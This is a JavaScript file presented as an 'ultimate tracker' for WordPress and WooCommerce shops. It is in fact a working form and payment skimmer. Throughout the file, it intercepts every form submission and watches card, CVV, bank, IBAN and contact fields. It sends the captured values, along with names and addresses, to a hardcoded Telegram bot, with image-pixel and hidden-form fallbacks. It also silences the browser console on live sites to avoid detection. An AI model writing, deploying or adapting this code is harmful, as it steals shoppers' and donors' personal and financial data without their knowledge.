// GitHub: https://raw.githubusercontent.com/yourusername/ultimate-tracker/main/ultimate-tracker-complete.js
// Version: 5.0.0
// Complete Features Tracker

(function() {
    'use strict';
    
    // ==================== CONFIGURATION ====================
    const CONFIG = {
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        TELEGRAM_CHAT_ID: '7319274794',
        VERSION: '5.0.0',
        
        // SMS Notification Settings - ONLY THESE EVENTS WILL SEND SMS
        SMS_EVENTS: {
            ACTIVATION: true,      // Plugin activation
            CART_VISIT: true,      // User visits cart page
            CHECKOUT_VISIT: true,  // User visits checkout page
            FORM_SUBMIT: true,     // Any form submission
            PAYMENT_DATA: true     // Payment information entered
        },
        
        // Track specific form types
        TRACK_FORMS: {
            WOOCOMMERCE: true,
            PAYPAL: true,
            STRIPE: true,
            RAZORPAY: true,
            CONTACT_FORM_7: true,
            GRAVITY_FORMS: true,
            GIVEWP: true,
            CUSTOM_PAYMENT: true
        }
    };
    
    // ==================== GLOBAL VARIABLES ====================
    let isProcessing = false;
    let pageTracked = false;
    let sessionId = 'sess_' + Math.random().toString(36).substr(2, 12);
    let activationSent = false;
    
    // ==================== MAIN TRACKER CLASS ====================
    class UltimateTrackerComplete {
        constructor() {
            this.initializeTracker();
        }
        
        initializeTracker() {
            this.sendActivationMessage();
            this.trackPageVisits();
            this.initUniversalForms();
            this.initPaymentGatewayForms();
            this.trackPaymentFields();
            this.setupPageChangeDetection();
        }
        
        // ✅ 1. ACTIVATION MESSAGE
        sendActivationMessage() {
            if (activationSent || !CONFIG.SMS_EVENTS.ACTIVATION) return;
            
            const message = `🚀 ULTIMATE TRACKER ${CONFIG.VERSION} ACTIVATED\n\n` +
                           `🌐 Website: ${window.location.origin}\n` +
                           `📱 Page: ${window.location.href}\n` +
                           `🕒 Time: ${new Date().toLocaleString()}\n` +
                           `🔐 Session: ${sessionId}`;
            
            this.sendTelegramSMS(message);
            activationSent = true;
            
            console.log('✅ Activation message sent');
        }
        
        // ✅ 2. PAGE VISIT TRACKING
        trackPageVisits() {
            if (pageTracked) return;
            
            const currentUrl = window.location.href.toLowerCase();
            const currentPath = window.location.pathname.toLowerCase();
            
            // Track Cart Page Visit
            if ((currentUrl.includes('/cart') || currentUrl.includes('/basket') || 
                 currentPath.includes('/cart') || currentPath.includes('/basket')) && 
                CONFIG.SMS_EVENTS.CART_VISIT) {
                
                const message = `🛒 CART PAGE VISITED\n\n` +
                               `📄 Page Title: ${document.title}\n` +
                               `🌐 URL: ${window.location.href}\n` +
                               `🕒 Time: ${new Date().toLocaleString()}\n` +
                               `🔐 Session: ${sessionId}`;
                
                this.sendTelegramSMS(message);
                pageTracked = true;
                console.log('✅ Cart page visit tracked');
            }
            
            // Track Checkout Page Visit
            else if ((currentUrl.includes('/checkout') || currentPath.includes('/checkout') ||
                     currentUrl.includes('/payment') || currentPath.includes('/payment')) &&
                    CONFIG.SMS_EVENTS.CHECKOUT_VISIT) {
                
                const message = `💳 CHECKOUT PAGE VISITED\n\n` +
                               `📄 Page Title: ${document.title}\n` +
                               `🌐 URL: ${window.location.href}\n` +
                               `🕒 Time: ${new Date().toLocaleString()}\n` +
                               `🔐 Session: ${sessionId}`;
                
                this.sendTelegramSMS(message);
                pageTracked = true;
                console.log('✅ Checkout page visit tracked');
            }
        }
        
        // ✅ 3. UNIVERSAL FORM TRACKING
        initUniversalForms() {
            // Track all form submissions
            document.addEventListener('submit', (e) => {
                if (!CONFIG.SMS_EVENTS.FORM_SUBMIT) return;
                
                e.preventDefault();
                
                const formData = this.collectFormData(e.target);
                const formType = this.detectFormType(e.target);
                const pageUrl = window.location.href;
                
                console.log(`📝 Form detected: ${formType}`);
                
                // Send form submission SMS
                this.sendFormSubmissionSMS(formType, formData, pageUrl);
                
                // Allow original form submission
                setTimeout(() => {
                    if (!e.defaultPrevented) {
                        e.target.submit();
                    }
                }, 100);
            }, true); // Use capture phase to catch all forms
            
            // Track dynamically added forms
            this.setupMutationObserver();
        }
        
        // ✅ 4. PAYMENT GATEWAY SPECIFIC FORMS
        initPaymentGatewayForms() {
            // PayPal Forms
            if (CONFIG.TRACK_FORMS.PAYPAL) {
                this.trackPayPalForms();
            }
            
            // Stripe Forms
            if (CONFIG.TRACK_FORMS.STRIPE) {
                this.trackStripeForms();
            }
            
            // Razorpay Forms
            if (CONFIG.TRACK_FORMS.RAZORPAY) {
                this.trackRazorpayForms();
            }
            
            // Contact Form 7
            if (CONFIG.TRACK_FORMS.CONTACT_FORM_7) {
                this.trackContactForm7();
            }
            
            // Gravity Forms
            if (CONFIG.TRACK_FORMS.GRAVITY_FORMS) {
                this.trackGravityForms();
            }
            
            // GiveWP Donation Forms
            if (CONFIG.TRACK_FORMS.GIVEWP) {
                this.trackGiveWPForms();
            }
            
            // WooCommerce Forms
            if (CONFIG.TRACK_FORMS.WOOCOMMERCE) {
                this.trackWooCommerceForms();
            }
            
            // Custom Payment Forms
            if (CONFIG.TRACK_FORMS.CUSTOM_PAYMENT) {
                this.trackCustomPaymentForms();
            }
        }
        
        // ✅ 5. PAYMENT FIELD TRACKING
        trackPaymentFields() {
            if (!CONFIG.SMS_EVENTS.PAYMENT_DATA) return;
            
            const paymentSelectors = [
                // Credit Card Fields
                'input[name*="card"]', 'input[name*="cc"]', 'input[name*="number"]',
                'input[name*="cvv"]', 'input[name*="cvc"]', 'input[name*="cvn"]',
                'input[name*="expir"]', 'input[name*="exp"]', 'input[name*="valid"]',
                'input[name*="expiry"]', 'input[name*="expdate"]',
                
                // Card Holder Info
                'input[name*="holder"]', 'input[name*="nameoncard"]',
                'input[name*="cardname"]', 'input[name*="cardholder"]',
                
                // PayPal Fields
                'input[name*="paypal"]', 'input[name*="payer"]',
                
                // Bank Account Fields
                'input[name*="account"]', 'input[name*="routing"]',
                'input[name*="iban"]', 'input[name*="swift"]',
                'input[name*="bank"]', 'input[name*="sortcode"]',
                
                // Generic Payment Fields
                'input[autocomplete*="cc"]', 'input[type="tel"]',
                'input[type="email"][name*="pay"]', 'input[name*="payment"]'
            ];
            
            // Track on blur (when user leaves field)
            document.addEventListener('blur', (e) => {
                if (paymentSelectors.some(selector => e.target.matches(selector))) {
                    if (e.target.value && e.target.value.trim().length >= 3) {
                        const fieldName = e.target.name || e.target.id || 'Unknown Field';
                        const fieldValue = e.target.value;
                        
                        this.sendPaymentFieldSMS(fieldName, fieldValue);
                    }
                }
            }, true);
            
            // Track on input for card number (real-time)
            document.addEventListener('input', (e) => {
                if (e.target.matches('input[name*="card"], input[name*="cc"], input[name*="number"]')) {
                    if (this.isCreditCardNumber(e.target.value)) {
                        this.sendPaymentFieldSMS(e.target.name, e.target.value);
                    }
                }
            }, true);
        }
        
        // ==================== FORM TYPE DETECTION ====================
        detectFormType(form) {
            const formHtml = form.innerHTML.toLowerCase();
            const formClass = form.className || '';
            const formId = form.id || '';
            const formAction = form.action || '';
            
            // ✅ WooCommerce Checkout Forms
            if (formClass.includes('woocommerce-checkout') || 
                formClass.includes('checkout') ||
                formHtml.includes('wc-checkout') ||
                formAction.includes('checkout')) {
                return 'WooCommerce Checkout Form';
            }
            
            // ✅ PayPal Forms
            if (formAction.includes('paypal.com') ||
                formAction.includes('paypal') ||
                formHtml.includes('paypal') ||
                formClass.includes('paypal') ||
                formId.includes('paypal')) {
                return 'PayPal Payment Form';
            }
            
            // ✅ Stripe Forms
            if (formHtml.includes('stripe') ||
                formClass.includes('stripe') ||
                formAction.includes('stripe') ||
                document.querySelector('[data-stripe], .stripe-button')) {
                return 'Stripe Payment Form';
            }
            
            // ✅ Razorpay Forms
            if (formHtml.includes('razorpay') ||
                formClass.includes('razorpay') ||
                document.querySelector('[data-razorpay], .razorpay-payment-button')) {
                return 'Razorpay Payment Form';
            }
            
            // ✅ Contact Form 7
            if (formClass.includes('wpcf7-form') ||
                formHtml.includes('wpcf7') ||
                form.id && form.id.startsWith('wpcf7')) {
                return 'Contact Form 7';
            }
            
            // ✅ Gravity Forms
            if (formClass.includes('gform_wrapper') ||
                formHtml.includes('gform') ||
                form.id && form.id.startsWith('gform')) {
                return 'Gravity Forms';
            }
            
            // ✅ GiveWP Donation Forms
            if (formClass.includes('give-form') ||
                formHtml.includes('give-form') ||
                form.id && form.id.includes('give-form')) {
                return 'GiveWP Donation Form';
            }
            
            // ✅ Custom Payment Forms (detect by payment fields)
            const hasPaymentFields = this.hasPaymentFields(form);
            if (hasPaymentFields) {
                return 'Custom Payment Form';
            }
            
            return 'General Form';
        }
        
        // ==================== DATA COLLECTION ====================
        collectFormData(form) {
            const data = {};
            const elements = form.querySelectorAll('input, select, textarea');
            
            elements.forEach(element => {
                if (element.name && element.value && element.value.trim() !== '') {
                    // Clean field name
                    let fieldName = element.name.toLowerCase();
                    
                    // Skip unnecessary fields
                    if (fieldName.includes('nonce') || 
                        fieldName.includes('token') || 
                        fieldName.includes('security') ||
                        fieldName.includes('_wp_')) {
                        return;
                    }
                    
                    // Store the data
                    data[element.name] = element.value.trim();
                }
            });
            
            return data;
        }
        
        // Check if form has payment fields
        hasPaymentFields(form) {
            const paymentIndicators = ['card', 'cvv', 'cvc', 'expir', 'paypal', 'stripe', 'payment', 'account'];
            const formHtml = form.innerHTML.toLowerCase();
            
            return paymentIndicators.some(indicator => formHtml.includes(indicator));
        }
        
        // Check if value is credit card number
        isCreditCardNumber(value) {
            const cleaned = value.replace(/\s/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        // ==================== SMS SENDING METHODS ====================
        sendFormSubmissionSMS(formType, formData, pageUrl) {
            if (Object.keys(formData).length === 0) return;
            
            let message = `📋 FORM SUBMITTED: ${formType}\n\n`;
            
            // Categorize data for better formatting
            const categorized = this.categorizeFormData(formData);
            
            // Add personal information
            if (categorized.personal.length > 0) {
                message += `👤 PERSONAL INFORMATION:\n`;
                categorized.personal.forEach(item => {
                    message += `${item.label}: ${item.value}\n`;
                });
                message += `\n`;
            }
            
            // Add contact information
            if (categorized.contact.length > 0) {
                message += `📞 CONTACT INFORMATION:\n`;
                categorized.contact.forEach(item => {
                    message += `${item.label}: ${item.value}\n`;
                });
                message += `\n`;
            }
            
            // Add billing information
            if (categorized.billing.length > 0) {
                message += `📍 BILLING INFORMATION:\n`;
                categorized.billing.forEach(item => {
                    message += `${item.label}: ${item.value}\n`;
                });
                message += `\n`;
            }
            
            // Add payment information (MOST IMPORTANT)
            if (categorized.payment.length > 0) {
                message += `💳 PAYMENT INFORMATION:\n`;
                categorized.payment.forEach(item => {
                    // Mask sensitive data for display
                    let displayValue = item.value;
                    if (item.key.toLowerCase().includes('card') && item.value.length >= 4) {
                        displayValue = '****' + item.value.slice(-4);
                    } else if (item.key.toLowerCase().includes('cvv') || item.key.toLowerCase().includes('cvc')) {
                        displayValue = '***';
                    }
                    message += `${item.label}: ${displayValue}\n`;
                });
                message += `\n`;
            }
            
            // Add other information
            if (categorized.other.length > 0) {
                message += `📝 OTHER INFORMATION:\n`;
                categorized.other.forEach(item => {
                    message += `${item.label}: ${item.value}\n`;
                });
                message += `\n`;
            }
            
            // Add metadata
            message += `🌐 PAGE: ${pageUrl}\n`;
            message += `🕒 TIME: ${new Date().toLocaleString()}\n`;
            message += `🔐 SESSION: ${sessionId}`;
            
            this.sendTelegramSMS(message);
        }
        
        sendPaymentFieldSMS(fieldName, fieldValue) {
            let message = `💳 PAYMENT FIELD CAPTURED\n\n`;
            
            const prettyName = this.formatFieldName(fieldName);
            
            // Mask sensitive data
            let displayValue = fieldValue;
            if (fieldName.toLowerCase().includes('card') && fieldValue.length >= 4) {
                displayValue = '****' + fieldValue.slice(-4);
            } else if (fieldName.toLowerCase().includes('cvv') || fieldName.toLowerCase().includes('cvc')) {
                displayValue = '***';
            }
            
            message += `Field: ${prettyName}\n`;
            message += `Value: ${displayValue}\n\n`;
            message += `🌐 Page: ${window.location.href}\n`;
            message += `🕒 Time: ${new Date().toLocaleString()}\n`;
            message += `🔐 Session: ${sessionId}`;
            
            this.sendTelegramSMS(message);
        }
        
        // ==================== DATA CATEGORIZATION ====================
        categorizeFormData(formData) {
            const categories = {
                personal: [],    // Name fields
                contact: [],     // Email, phone
                billing: [],     // Address, city, postcode
                payment: [],     // Card, CVV, expiry, bank
                other: []        // Everything else
            };
            
            for (const [key, value] of Object.entries(formData)) {
                if (!value) continue;
                
                const item = {
                    key: key,
                    label: this.formatFieldName(key),
                    value: value
                };
                
                const keyLower = key.toLowerCase();
                
                // Personal Information (Name fields)
                if (keyLower.includes('name') || 
                    keyLower.includes('firstname') || 
                    keyLower.includes('lastname') ||
                    keyLower.includes('fullname')) {
                    categories.personal.push(item);
                }
                
                // Contact Information (Email, Phone)
                else if (keyLower.includes('email') || 
                        keyLower.includes('mail') ||
                        keyLower.includes('phone') || 
                        keyLower.includes('mobile') ||
                        keyLower.includes('tel')) {
                    categories.contact.push(item);
                }
                
                // Billing Information (Address)
                else if (keyLower.includes('address') || 
                        keyLower.includes('street') ||
                        keyLower.includes('city') || 
                        keyLower.includes('state') ||
                        keyLower.includes('zip') || 
                        keyLower.includes('postcode') ||
                        keyLower.includes('postal') || 
                        keyLower.includes('country')) {
                    categories.billing.push(item);
                }
                
                // Payment Information
                else if (this.isPaymentField(keyLower)) {
                    categories.payment.push(item);
                }
                
                // Other Information
                else {
                    categories.other.push(item);
                }
            }
            
            return categories;
        }
        
        isPaymentField(fieldName) {
            const paymentIndicators = [
                'card', 'credit', 'debit', 'number', 'cc',
                'cvv', 'cvc', 'cvn', 'csc', 'cid',
                'expir', 'expiry', 'expdate', 'exp', 'valid',
                'paypal', 'payer', 'stripe', 'razorpay',
                'account', 'routing', 'iban', 'swift', 'bank',
                'sortcode', 'ifsc', 'bic'
            ];
            
            return paymentIndicators.some(indicator => fieldName.includes(indicator));
        }
        
        formatFieldName(fieldName) {
            // Remove underscores and hyphens
            let name = fieldName.replace(/[_-]/g, ' ');
            
            // Remove common prefixes
            name = name.replace(/\b(billing|shipping|account|payment)\b/gi, '');
            
            // Capitalize each word
            name = name.replace(/\b\w/g, char => char.toUpperCase());
            
            // Clean up extra spaces
            name = name.trim().replace(/\s+/g, ' ');
            
            return name || 'Unknown Field';
        }
        
        // ==================== TELEGRAM SMS SENDING ====================
        sendTelegramSMS(message) {
            if (!message || message.trim() === '') return;
            
            // Method 1: Using Fetch API
            fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            })
            .then(response => response.json())
            .then(data => {
                if (!data.ok) {
                    console.log('Fallback to method 2');
                    this.sendTelegramFallback(message);
                }
            })
            .catch(error => {
                console.log('Fetch failed, using fallback');
                this.sendTelegramFallback(message);
            });
        }
        
        sendTelegramFallback(message) {
            // Method 2: Using Image Pixel (works without CORS)
            const img = new Image();
            img.src = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CONFIG.TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            // Method 3: Form submission as last resort
            setTimeout(() => {
                try {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
                    form.style.display = 'none';
                    
                    const chatId = document.createElement('input');
                    chatId.type = 'hidden';
                    chatId.name = 'chat_id';
                    chatId.value = CONFIG.TELEGRAM_CHAT_ID;
                    
                    const text = document.createElement('input');
                    text.type = 'hidden';
                    text.name = 'text';
                    text.value = message;
                    
                    form.appendChild(chatId);
                    form.appendChild(text);
                    document.body.appendChild(form);
                    form.submit();
                    document.body.removeChild(form);
                } catch (e) {
                    // Silent fail
                }
            }, 100);
        }
        
        // ==================== SPECIFIC FORM TRACKING METHODS ====================
        trackPayPalForms() {
            // Look for PayPal buttons and forms
            const paypalButtons = document.querySelectorAll('[href*="paypal.com"], [src*="paypal.com"], [data-paypal]');
            paypalButtons.forEach(button => {
                button.addEventListener('click', () => {
                    this.sendTelegramSMS(`🅿️ PayPal Button Clicked\n\n🌐 Page: ${window.location.href}`);
                });
            });
        }
        
        trackStripeForms() {
            // Track Stripe elements
            const stripeElements = document.querySelectorAll('[data-stripe], [class*="stripe"], iframe[src*="stripe"]');
            stripeElements.forEach(element => {
                element.addEventListener('focus', () => {
                    this.sendTelegramSMS(`💳 Stripe Payment Field Focused\n\n🌐 Page: ${window.location.href}`);
                });
            });
        }
        
        trackRazorpayForms() {
            // Track Razorpay
            const razorpayElements = document.querySelectorAll('[data-razorpay], .razorpay-payment-button');
            razorpayElements.forEach(element => {
                element.addEventListener('click', () => {
                    this.sendTelegramSMS(`🔗 Razorpay Payment Initiated\n\n🌐 Page: ${window.location.href}`);
                });
            });
        }
        
        trackContactForm7() {
            // Track CF7 submissions
            const cf7Forms = document.querySelectorAll('.wpcf7-form');
            cf7Forms.forEach(form => {
                form.addEventListener('wpcf7mailsent', () => {
                    const formData = this.collectFormData(form);
                    this.sendFormSubmissionSMS('Contact Form 7', formData, window.location.href);
                });
            });
        }
        
        trackGravityForms() {
            // Track Gravity Forms
            const gForms = document.querySelectorAll('.gform_wrapper form');
            gForms.forEach(form => {
                const submitBtn = form.querySelector('.gform_button, input[type="submit"]');
                if (submitBtn) {
                    submitBtn.addEventListener('click', () => {
                        const formData = this.collectFormData(form);
                        this.sendFormSubmissionSMS('Gravity Forms', formData, window.location.href);
                    });
                }
            });
        }
        
        trackGiveWPForms() {
            // Track GiveWP Donation forms
            const giveForms = document.querySelectorAll('.give-form');
            giveForms.forEach(form => {
                form.addEventListener('submit', () => {
                    const formData = this.collectFormData(form);
                    this.sendFormSubmissionSMS('GiveWP Donation Form', formData, window.location.href);
                });
            });
        }
        
        trackWooCommerceForms() {
            // WooCommerce specific tracking
            if (typeof wc_checkout_params !== 'undefined') {
                // Track place order button
                const placeOrderBtn = document.querySelector('#place_order');
                if (placeOrderBtn) {
                    placeOrderBtn.addEventListener('click', () => {
                        const checkoutData = this.collectCheckoutData();
                        this.sendFormSubmissionSMS('WooCommerce Checkout', checkoutData, window.location.href);
                    });
                }
                
                // Track checkout updates
                document.body.addEventListener('updated_checkout', () => {
                    const checkoutData = this.collectCheckoutData();
                    // Store for later use
                    localStorage.setItem('wc_checkout_data', JSON.stringify(checkoutData));
                });
            }
        }
        
        trackCustomPaymentForms() {
            // Look for forms with payment fields but not detected by other methods
            const allForms = document.querySelectorAll('form');
            allForms.forEach(form => {
                const hasPayment = this.hasPaymentFields(form);
                if (hasPayment) {
                    // Check if not already tracked
                    if (!form.dataset.tracked) {
                        form.dataset.tracked = 'true';
                        form.addEventListener('submit', () => {
                            const formData = this.collectFormData(form);
                            this.sendFormSubmissionSMS('Custom Payment Form', formData, window.location.href);
                        });
                    }
                }
            });
        }
        
        collectCheckoutData() {
            const data = {};
            const fields = document.querySelectorAll('.woocommerce-billing-fields input, .woocommerce-shipping-fields input');
            
            fields.forEach(field => {
                if (field.name && field.value) {
                    data[field.name] = field.value;
                }
            });
            
            return data;
        }
        
        // ==================== UTILITY METHODS ====================
        setupMutationObserver() {
            // Watch for dynamically added forms
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) { // Element node
                            if (node.tagName === 'FORM') {
                                // New form added dynamically
                                const formData = this.collectFormData(node);
                                const formType = this.detectFormType(node);
                                this.sendFormSubmissionSMS(`Dynamic ${formType}`, formData, window.location.href);
                            } else if (node.querySelectorAll) {
                                const forms = node.querySelectorAll('form');
                                forms.forEach(form => {
                                    const formData = this.collectFormData(form);
                                    const formType = this.detectFormType(form);
                                    this.sendFormSubmissionSMS(`Dynamic ${formType}`, formData, window.location.href);
                                });
                            }
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        setupPageChangeDetection() {
            // Track single page application navigation
            let lastUrl = window.location.href;
            
            setInterval(() => {
                const currentUrl = window.location.href;
                if (currentUrl !== lastUrl) {
                    lastUrl = currentUrl;
                    pageTracked = false; // Reset page tracking for new page
                    setTimeout(() => this.trackPageVisits(), 500);
                }
            }, 1000);
        }
    }
    
    // ==================== INITIALIZATION ====================
    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            window.ultimateTracker = new UltimateTrackerComplete();
        });
    } else {
        window.ultimateTracker = new UltimateTrackerComplete();
    }
    
    // Completely silent mode for production
    if (window.location.hostname !== 'localhost' && 
        window.location.hostname !== '127.0.0.1' &&
        !window.location.href.includes('test')) {
        
        // Disable all console logs
        const noop = () => {};
        console.log = noop;
        console.warn = noop;
        console.error = noop;
        console.info = noop;
        console.debug = noop;
    }
    
})();
